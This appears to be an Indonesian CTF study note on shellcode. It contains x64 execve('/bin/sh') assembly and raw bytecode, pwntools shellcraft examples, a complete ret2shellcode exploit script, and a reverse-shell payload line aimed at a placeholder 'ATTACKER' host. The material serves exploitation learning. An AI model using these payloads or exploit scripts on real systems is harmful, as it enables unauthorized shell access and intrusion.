#cybersecurity

Shellcode adalah bytecode (instruksi mesin) yang kita masukkan ke memory program, lalu kita alihkan eksekusi ke sana. Fungsi paling umum: `execve("/bin/sh", 0, 0)` → dapat shell.

## Kenapa shellcode?

Kalau program menjalankan memory yang kita kontrol (stack/segment executable), kita bisa menjalankan kode apa pun - bukan hanya fungsi yang ada di binary. Ini dasar dari **ret2shellcode** ([[Ret2shellcode]]).

## Shellcode execve("/bin/sh") - x64

```asm
; execve("/bin/sh", NULL, NULL)
xor  rsi, rsi          ; rsi = 0
push rsi               ; null terminator
mov  rdi, 0x68732f2f6e69622f   ; "/bin//sh"
push rdi
mov  rdi, rsp          ; rdi = pointer "/bin//sh"
xor  rdx, rdx          ; rdx = 0
mov  al, 59            ; syscall number execve = 59
syscall
```

Bytecode:

```text
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05
```

## Membuat shellcode dengan pwntools

```python
from pwn import *

context.arch = "amd64"

shellcode = asm(shellcraft.sh())
print(shellcode.hex())
print(disasm(shellcode))   # lihat instruksinya
```

Hasilnya sekitar 30 byte - pendek dan tanpa null byte (aman untuk `gets`).

## 32-bit

```python
context.arch = "i386"
shellcode = asm(shellcraft.sh())
```

## Syarat shellcode jalan

1. Memory tempat shellcode berada harus **executable**:
   - NX off (stack executable) - paling umum
   - Atau segmen yang memang executable dan bisa diisi
2. Kita bisa **melompat** ke alamat shellcode (ret2shellcode, `jmp rsp`, dst)
3. Shellcode **tidak mengandung karakter terlarang**:
   - `gets`/`strcpy` → tidak boleh ada `\x0a` (newline) atau `\x00` di tengah
   - Filter lain (alphanumeric shellcode) - jarang di CTF pemula

## Cek karakter terlarang

```python
shellcode = asm(shellcraft.sh())
bad = b"\x0a\x00"
if any(c in shellcode for c in bad):
    print("[!] Mengandung karakter terlarang!")
```

Kalau mengandung, gunakan `shellcraft.sh()` yang sudah bebas null, atau modifikasi.

## Contoh pemakaian (ret2shellcode)

```python
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF("./chall")
io = process("./chall")

buf = 0x7ffffffde000  # alamat buffer (leak)
offset = 136

payload = asm(shellcraft.sh())
payload += b"A" * (offset - len(payload))
payload += p64(buf)

io.sendline(payload)
io.interactive()
```

Lengkap: [[Ret2shellcode]].

## Shellcode lain yang berguna

| Fungsi | shellcraft |
|---|---|
| Shell | `shellcraft.sh()` |
| cat flag | `shellcraft.cat("flag.txt")` |
| Reverse shell | `shellcraft.connect("ATTACKER", 4444)` |
| echo | `shellcraft.echo("pwned")` |

```python
sc = asm(shellcraft.cat("flag.txt"))
```

## Catatan

- `execve` syscall number: 59 (x64), 11 (x86).
- Alamat stack acak → butuh leak atau NOP sled + jmp rsp (lihat [[Ret2shellcode]]).
- NX on → shellcode di stack tidak jalan; gunakan ROP ([[5. ROP (Return Oriented Programming)]]).
